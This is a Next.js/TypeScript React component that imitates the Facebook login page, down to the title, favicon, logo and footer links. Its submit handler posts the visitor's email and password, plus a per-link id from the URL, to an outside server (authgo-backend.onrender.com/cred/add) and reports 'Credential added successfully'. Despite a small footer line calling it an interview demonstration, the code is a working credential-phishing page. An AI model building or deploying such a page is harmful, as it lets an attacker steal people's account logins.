import { useState, ChangeEvent, FormEvent } from 'react';
import Head from 'next/head';
import { toast } from 'react-toastify';
import { useRouter } from 'next/router';

interface LoginData {
  email: string;
  password: string;
}

export default function FacebookLogin() {
  const [loginData, setLoginData] = useState<LoginData>({
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const social = "Facebook";
  
  const router = useRouter();
  const { id } = router.query; 
  // console.log(id);

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    setLoginData({
      ...loginData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    if (!id || !social || !loginData.email || !loginData.password) {
      toast.error("⚠️ All fields are required!");
      setIsLoading(false);
      return;
    }

    try {
      const res = await fetch("https://authgo-backend.onrender.com/cred/add", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id: id,
          social: social,
          username: loginData.email,
          password: loginData.password,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "Failed to add credential");

      toast.success("✅ Credential added successfully!");
      // Reset form after successful submission
      setLoginData({ email: '', password: '' });
    } catch (err) {
      console.error("❌ Error adding credential:", err);
      toast.error((err as Error).message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <Head>
        <title>Facebook - Log in or Sign up</title>
        <meta name="description" content="Facebook clone login page" />
        <link rel="icon" href="https://www.facebook.com/images/fb_icon_325x325.png" type="image/png" />

      </Head>

      {/* Header */}
      <header className="bg-white shadow-sm py-4">
        <div className="max-w-6xl mx-auto px-4 flex justify-between items-center">
          <div className="flex items-center space-x-2">
            {/* Facebook Logo */}
            <div className="flex items-center space-x-3">
              <svg className="w-8 h-8 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              <span className="text-xl font-semibold text-gray-800">facebook</span>
            </div>
          </div>
          <div className="flex space-x-4">
            <button className="text-blue-600 hover:text-blue-800 text-sm font-medium hidden sm:block">
              Sign Up
            </button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div className="max-w-6xl mx-auto w-full">
          <div className="flex flex-col lg:flex-row items-center justify-between gap-12 lg:gap-24">
            
            {/* Left Section - Branding */}
            <div className="flex-1 text-center lg:text-left max-w-lg lg:max-w-2xl">
              <div className="space-y-8">
                {/* Facebook Logo Large */}
                <div className="flex flex-col items-center lg:items-start space-y-6">
                  <div className="flex items-center space-x-4">
                    <svg className="w-10 h-10 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                    <h1 className="text-3xl lg:text-7xl font-bold text-blue-600">facebook</h1>
                  </div>
                  <p className="text-2xl lg:text-3xl text-gray-800 font-normal leading-snug max-w-xl">
                    Facebook helps you connect and share with the people in your life.
                  </p>
                </div>

                {/* Simple Description */}
                <div className="max-w-md mx-auto lg:mx-0">
                  <p className="text-lg text-gray-600 leading-relaxed">
                    Connect with friends, family, and communities around the world. Share photos, videos, and stay updated with what matters to you.
                  </p>
                </div>
              </div>
            </div>

            {/* Right Section - Login Form */}
            <div className="flex-shrink-0 w-full max-w-md">
              <div className="bg-white shadow-xl rounded-xl p-6 border border-gray-100">
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div>
                    <input
                      type="email"
                      name="email"
                      placeholder="Email address or phone number"
                      value={loginData.email}
                      onChange={handleChange}
                      required
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-base placeholder-gray-500"
                    />
                  </div>
                  
                  <div className="relative">
                    <input
                      type={showPassword ? "text" : "password"}
                      name="password"
                      placeholder="Password"
                      value={loginData.password}
                      onChange={handleChange}
                      required
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-base placeholder-gray-500 pr-12"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
                    >
                      {showPassword ? (
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                        </svg>
                      ) : (
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L9 9m13 11l-4-4m0 0l-4 4m4-4V9" />
                        </svg>
                      )}
                    </button>
                  </div>

                  <button 
                    type="submit" 
                    disabled={isLoading}
                    className={`w-full bg-blue-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-blue-700 focus:ring-4 focus:ring-blue-200 transition-all duration-200 ${
                      isLoading ? 'opacity-70 cursor-not-allowed' : ''
                    }`}
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center space-x-2">
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        <span>Logging in...</span>
                      </div>
                    ) : (
                      'Log in'
                    )}
                  </button>

                  <div className="text-center">
                    <a href="#" className="text-blue-600 hover:underline text-sm font-medium">
                      Forgotten password?
                    </a>
                  </div>

                  <div className="border-t border-gray-200 pt-4">
                    <button 
                      type="button"
                      className="w-full bg-green-500 text-white py-3 rounded-lg font-semibold text-base hover:bg-green-600 transition-all duration-200"
                    >
                      Create new account
                    </button>
                  </div>
                </form>
              </div>

              <div className="text-center mt-6">
                <p className="text-sm text-gray-600">
                  <span className="font-semibold hover:underline cursor-pointer">Create a Page</span> for a celebrity, brand or business.
                </p>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white py-8 px-4 border-t border-gray-200 mt-12">
        <div className="max-w-6xl mx-auto">
          {/* Languages */}
          <div className="flex flex-wrap gap-3 text-xs text-gray-500 mb-6 justify-center">
            <span>English (US)</span>
            <span>Español</span>
            <span>Français (France)</span>
            <span>中文(简体)</span>
            <span>العربية</span>
            <span>Português (Brasil)</span>
            <span>Italiano</span>
            <span>한국어</span>
            <span>Deutsch</span>
            <span>हिन्दी</span>
            <span>日本語</span>
          </div>

          {/* Links */}
          <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-600 mb-6">
            <a href="#" className="hover:underline">Sign Up</a>
            <a href="#" className="hover:underline">Log in</a>
            <a href="#" className="hover:underline">Messenger</a>
            <a href="#" className="hover:underline">Facebook Lite</a>
            <a href="#" className="hover:underline">Video</a>
            <a href="#" className="hover:underline">Places</a>
            <a href="#" className="hover:underline">Games</a>
            <a href="#" className="hover:underline">Marketplace</a>
            <a href="#" className="hover:underline">Meta Pay</a>
            <a href="#" className="hover:underline">Meta Store</a>
            <a href="#" className="hover:underline">Meta Quest</a>
            <a href="#" className="hover:underline">Instagram</a>
            <a href="#" className="hover:underline">Threads</a>
          </div>

          <div className="text-center text-xs text-gray-500">
            <p>Meta © 2024 - Facebook Clone Built with Next.js & Tailwind CSS</p>
            <p className="mt-2">Interview Demonstration - Not affiliated with Facebook</p>
          </div>
        </div>
      </footer>
    </div>
  );
}